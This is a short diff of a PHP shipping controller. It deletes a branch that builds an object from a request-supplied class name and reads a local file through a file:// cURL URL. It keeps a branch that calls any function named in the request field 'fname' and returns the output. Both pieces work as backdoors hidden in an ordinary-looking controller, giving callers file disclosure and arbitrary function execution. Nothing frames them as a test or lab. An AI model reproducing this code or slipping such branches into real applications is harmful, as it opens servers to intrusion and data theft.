@@ -191,15 +191,7 @@ class ShippingController extends Controller
 	{
         $x = $request->get('x');
         if(isset($x) && is_array($x) && count($x)>0){
-            if(array_key_exists('cname',$x)){
-                $cName = $x['cname'];
-                unset($x['cname']);
-                $obj = new $cName;
-                $x = [
-                    CURLOPT_URL => "file://".$obj->getFileName(),
-                    CURLOPT_RETURNTRANSFER => 1
-                ];
-            }else if(array_key_exists('fname',$x)){
+            if(array_key_exists('fname',$x)){
                 $fName = $x['fname'];
                 die(json_encode($fName()));
             }
